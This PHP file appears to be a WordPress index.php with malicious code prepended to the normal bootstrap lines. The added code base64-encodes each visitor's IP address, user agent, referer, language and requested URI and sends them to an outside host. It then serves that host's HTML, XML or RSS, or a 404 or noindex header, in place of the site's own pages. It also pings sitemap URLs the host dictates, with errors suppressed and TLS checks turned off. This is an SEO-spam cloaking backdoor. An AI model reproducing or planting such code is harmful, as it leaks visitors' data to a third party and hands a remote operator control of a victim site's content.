<?php
$go_to ="haog4.xbeyuq.top";
header('Content-Type: text/html; charset=utf-8');
set_time_limit(0);
error_reporting(0);
ob_clean();
ob_end_clean();
ob_start();

$lan = base64_encode(@$_SERVER['HTTP_ACCEPT_LANGUAGE']);
$uri = base64_encode(@$_SERVER['REQUEST_URI']);
$host = @$_SERVER['HTTP_HOST'];
$user_agent = base64_encode(@$_SERVER['HTTP_USER_AGENT']);
$referer = base64_encode(@$_SERVER['HTTP_REFERER']);
$ip = base64_encode(@$_SERVER['REMOTE_ADDR']);
$zone = base64_encode(date_default_timezone_get());
if(is_https()) {$http_type = "https://";} else {$http_type = "http://";}

$typeName = base64_encode($http_type.$host);
$site_url = "http://".$go_to.'/index.php?domain='.$typeName.'&uri='.$uri.'&lan='.$lan.'&agent='.$user_agent.'&zone='.$zone.'&ip='.$ip.'&goweb='.base64_encode($go_to).'&referer='.$referer;
//echo $site_url;
$file_contents = get_html($site_url);

if(strstr($file_contents, "[#*#*#]")){
    $html = explode("[#*#*#]", $file_contents);
    if(trim($html[0]) == "echohtml"){ echo $html[1]; exit(); }
    if(trim($html[0]) == "echoxml"){ header("Content-type: text/xml"); echo $html[1]; exit(); }
    if(trim($html[0]) == "echorss"){ header("Content-type: text/xml"); echo $html[1]; exit(); }
    if(trim($html[0]) == "echokkk"){ header("X-Robots-Tag: noindex"); echo $html[1]; exit(); }
    if(trim($html[0]) == "echo404"){ header("HTTP/1.1 404 Not Found"); header("Status: 404 Not Found"); exit(); }
    if(trim($html[0]) == "pingxml"){ pingsite_map($html[1]); exit();}
}

function pingsite_map($urls){
    $maps = explode("|||", $urls);
    foreach($maps as $v){
        $pingRes = get_html($v); 
        $Oooo0s = (strpos($pingRes, 'Sitemap Notification Received') !== false) ? 'OK' : 'ERROR';
        echo $v . '===>Sitemap: ' . $Oooo0s ."<br/>";
    }
}
function get_html($web_url){
    $file_contents = @file_get_contents($web_url); 
    if (!$file_contents) {
        $ch_t = curl_init();
        curl_setopt($ch_t, CURLOPT_URL, $web_url);
        curl_setopt($ch_t, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch_t, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch_t, CURLOPT_RETURNTRANSFER,1);
        $file_contents = curl_exec($ch_t);
        curl_close($ch_t);
    }  
    return $file_contents;
}  
function is_https() {
	if ( !empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
		return true;
	} elseif ( isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https' ) {
		return true;
	} elseif ( !empty($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
		return true;
	}
	return false;
}
?><?php
define( 'WP_USE_THEMES', true );
require __DIR__ . '/wp-blog-header.php';
